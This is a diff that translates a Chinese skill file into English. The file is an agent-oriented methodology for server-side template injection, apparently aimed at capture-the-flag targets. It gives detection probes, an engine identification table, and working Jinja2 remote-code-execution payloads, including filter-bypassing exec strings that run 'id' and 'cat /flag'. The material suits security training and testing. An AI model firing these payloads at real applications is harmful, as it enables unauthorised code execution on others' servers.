@@ -1,103 +1,106 @@
 ---
 name: ssti-methodology
-description: "服务端模板注入(SSTI)的检测、引擎识别和利用。当目标是Flask/Jinja2/Django/Twig/Mako/Pug应用、存在用户输入回显、参数名含template/name/message/greeting时使用。Phase 0/1即覆盖快速检测和引擎识别，无须单独skill。如只需快速检测定位可直接使用Phase 0/1，无需阅读完整利用部分"
+description: "Detection, engine identification, and exploitation of server-side template injection (SSTI). Use when the target is a Flask/Jinja2/Django/Twig/Mako/Pug application, when user input is reflected back, or when parameter names contain template/name/message/greeting. Phase 0/1 already covers quick detection and engine identification, so no separate skill is needed. For quick detection and localization only, use Phase 0/1 directly without reading the full exploitation section"
+zh-signals: "服务端模板注入的检测、引擎识别与利用方法。信号:SSTI,模板注入,Jinja2,Twig,RCE"
+when-to-use: >-
+  Use when user input is reflected in page output or a Flask, Django, Jinja2, Twig, Mako, or Pug application is suspected of template injection.
 metadata:
   tags: "ssti,template injection,template-injection,server-side template injection,jinja2,django,twig,mako,rce,sandbox-escape"
   category: "exploit"
 ---
 
-# SSTI 服务端模板注入方法论
+# SSTI Server-Side Template Injection Methodology
 
-## ⛔ 深入参考（确认引擎后必读对应文件）
+## ⛔ Deep Reference (read the matching file once the engine is confirmed)
 
-- Jinja2 完整利用链（上下文变量→文件读取→RCE）→ [references/jinja2-exploitation.md](references/jinja2-exploitation.md)
-- Twig/Mako/FreeMarker/Pug/Django 利用或过滤绕过 → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
-- 多引擎 RCE payload 速查与沙箱逃逸 → [references/multi-engine-payloads.md](references/multi-engine-payloads.md)
+- Jinja2 complete exploit chain (context variables → file read → RCE) → [references/jinja2-exploitation.md](references/jinja2-exploitation.md)
+- Twig/Mako/FreeMarker/Pug/Django exploitation or filter bypass → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
+- Multi-engine RCE payload quick reference and sandbox escape → [references/multi-engine-payloads.md](references/multi-engine-payloads.md)
 
 ---
 
-## Phase 0: 注入点定位（最先执行！）
+## Phase 0: Injection Point Localization (do this first!)
 
-**不要盲目在所有参数上尝试 SSTI payload！** 先定位哪些参数会被模板渲染：
+**Do not blindly try SSTI payloads on every parameter!** First determine which parameters get rendered by the template:
 
-1. 用 analyze_response 观察哪些参数值**出现在响应中**
-2. 只有**回显到页面的参数**才可能是注入点
-3. 常见回显参数：`name`, `username`, `message`, `greeting`, `template`, `title`, `q`, `search`
+1. Use analyze_response to see which parameter values **appear in the response**
+2. Only **parameters reflected back into the page** can be injection points
+3. Common reflected parameters: `name`, `username`, `message`, `greeting`, `template`, `title`, `q`, `search`
 
-**陷阱**：HTML 转义的回显（`<` → `&lt;`）仍可能被模板渲染——`{{7*7}}` 可能生效。
+**Trap**: An HTML-escaped reflection (`<` → `&lt;`) may still be rendered by the template — `{{7*7}}` may still work.
 
-## Phase 1: 检测模板注入（决策树）
+## Phase 1: Template Injection Detection (Decision Tree)
 
 ```
-Step 1: 发送 {{7*7}}
-  → 返回 49 → 进入 Step 2
-  → 原样返回 → 不是 Jinja2/Twig，进入 Step 3
-  → 返回空/错误 → 可能有过滤，尝试 {{7*'7'}}
+Step 1: Send {{7*7}}
+  → Returns 49 → go to Step 2
+  → Returned as-is → not Jinja2/Twig, go to Step 3
+  → Empty/error response → filtering is likely in place, try {{7*'7'}}
 
-Step 2: 发送 {{7*'7'}}
-  → 返回 7777777 → Jinja2 (Python) ★最常见
-  → 返回 49 → Twig (PHP)
+Step 2: Send {{7*'7'}}
+  → Returns 7777777 → Jinja2 (Python) ★most common
+  → Returns 49 → Twig (PHP)
 
-Step 3: 发送 ${7*7}
-  → 返回 49 → Java EL / Mako / FreeMarker
-Step 4: 发送 #{7*7}
-  → 返回 49 → Ruby ERB 或 Pug
+Step 3: Send ${7*7}
+  → Returns 49 → Java EL / Mako / FreeMarker
+Step 4: Send #{7*7}
+  → Returns 49 → Ruby ERB or Pug
 ```
 
-## Phase 2: 引擎识别辅助表
+## Phase 2: Engine Identification Helper Table
 
-| 引擎 | 语言 | Server 头线索 | 确认方法 |
+| Engine | Language | Server header clues | Confirmation method |
 |------|------|-------------|---------|
-| Jinja2 | Python/Flask | Werkzeug, gunicorn | `{{config}}` 有输出 |
+| Jinja2 | Python/Flask | Werkzeug, gunicorn | `{{config}}` produces output |
 | Django | Python | WSGIServer | `{{settings.DEBUG}}` |
 | Twig | PHP | Apache+PHP | `{{_self.env.display('id')}}` |
 | Mako | Python | - | `${self.module.__builtins__}` |
-| FreeMarker | Java | Tomcat, Spring | `${.now}` 返回当前时间 |
-| Pug/Jade | Node.js | Express | `#{7*7}` 返回 49 |
+| FreeMarker | Java | Tomcat, Spring | `${.now}` returns the current time |
+| Pug/Jade | Node.js | Express | `#{7*7}` returns 49 |
 
-## Phase 3: 利用决策树
+## Phase 3: Exploitation Decision Tree
 
 ```
-确认引擎类型
-├─ Jinja2？→ [references/jinja2-exploitation.md](references/jinja2-exploitation.md)
-│   优先级：上下文变量 → config → 文件读取 → RCE(lipsum链)
-├─ Twig？→ [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
-├─ Mako/FreeMarker/Pug？→ [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
-├─ Django？→ [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
-│   无 RCE！优先级：上下文变量穷举 → request.META → settings → admin 路径发现
-└─ 有过滤？→ [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)（过滤绕过部分）
+Confirm the engine type
+├─ Jinja2? → [references/jinja2-exploitation.md](references/jinja2-exploitation.md)
+│   Priority: context variables → config → file read → RCE (lipsum chain)
+├─ Twig? → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
+├─ Mako/FreeMarker/Pug? → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
+├─ Django? → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
+│   No RCE! Priority: enumerate context variables → request.META → settings → admin path discovery
+└─ Filtering present? → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md) (filter bypass section)
 ```
 
-**Jinja2 速查**（完整 payload → [references/jinja2-exploitation.md](references/jinja2-exploitation.md)）：
+**Jinja2 Quick Reference** (full payloads → [references/jinja2-exploitation.md](references/jinja2-exploitation.md)):
 ```
-{{lipsum.__globals__['os'].popen('id').read()}}       # RCE 首选
-{{config}}                                              # 读配置
+{{lipsum.__globals__['os'].popen('id').read()}}       # RCE first choice
+{{config}}                                              # read configuration
 ```
 
-## 注意事项
-- **先简单后复杂**：上下文变量 → config → 文件读取 → RCE
-- **URL 编码**：GET 参数注入时 `{{` `}}` 需要编码
-- **错误信息**：500 页面可能泄露引擎类型和 Python 版本
+## Notes
+- **Simple before complex**: context variables → config → file read → RCE
+- **URL encoding**: `{{` `}}` must be encoded when injecting into GET parameters
+- **Error messages**: 500 pages may leak the engine type and the Python version
 
-## Phase 4: 高级利用技术
+## Phase 4: Advanced Exploitation Techniques
 
-### 4.1 子类遍历与 Payload 构造
-- 使用循环 for + enumerate 遍历子类列表
-- 目标类：`os._wrap_close`、`subprocess.Popen`
-- 条件过滤：`if 'popen' in str(cls)` — 字符串匹配筛选
-- 不同环境索引不同，需要动态查找而非硬编码索引
+### 4.1 Subclass Enumeration and Payload Construction
+- Use a for loop with enumerate to walk the subclass list
+- Target classes: `os._wrap_close`, `subprocess.Popen`
+- Conditional filter: `if 'popen' in str(cls)` — string matching to select candidates
+- Indexes differ across environments, so find them dynamically instead of hardcoding an index
 
-### 4.2 过滤绕过技巧
-- 外部传参：`?a=__class__&b=__mro__`，模板中用 `request.args.a` 引用
-- 过滤只在模板内容检查，不检查 URL 参数
-- 拆分 payload：注入点和数据点分离
-- 关键词被过滤时，通过 `globals.__self__` 到达 builtins 模块，用字符串拼接绕过：
+### 4.2 Filter Bypass Techniques
+- Pass parameters externally: `?a=__class__&b=__mro__`, then reference them in the template with `request.args.a`
+- Filters only inspect template content, not URL parameters
+- Split the payload: keep the injection point separate from the data point
+- When a keyword is filtered, reach the builtins module through `globals.__self__` and bypass it with string concatenation:
   ```python
   {{ globals.__self__.exec("imp" + "ort o" + "s;o" + "s.system('cat /flag')") }}
   {{ request.__class__.__init__.__globals__.__builtins__.exec("__imp"+"ort__('o'+'s').system('id')") }}
   ```
 
-### 4.3 利用顺序
-- 优先级最高：先试简单的，直接变量访问（`{{config}}`）
-- 顺序：先确认后利用，先识别引擎再选 payload
-- 最终：http_request 发送 RCE payload 获取 flag
+### 4.3 Exploitation Order
+- Highest priority: try the simple option first — direct variable access (`{{config}}`)
+- Order: confirm before exploiting — identify the engine first, then pick the payload
+- Finally: use http_request to send the RCE payload and capture the flag
